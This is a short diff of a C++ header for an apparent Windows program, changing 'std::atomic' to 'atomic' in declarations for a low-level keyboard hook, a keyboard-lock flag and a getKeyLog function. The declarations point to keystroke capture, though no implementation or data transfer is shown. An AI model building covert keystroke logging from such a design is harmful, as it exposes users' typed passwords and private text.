@@ -26,7 +26,7 @@ Response getKeyLog(int duration);
 // Global variables
 extern HHOOK hKeyboardHook; // Keyboard hook handle
 extern bool isKeyboardLocked; // Keyboard lock state
-extern std::atomic<bool> isRunning; // Atomic flag for hook thread loop
+extern atomic<bool> isRunning; // Atomic flag for hook thread loop
 extern DWORD hookThreadId; // ID of the hook thread
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
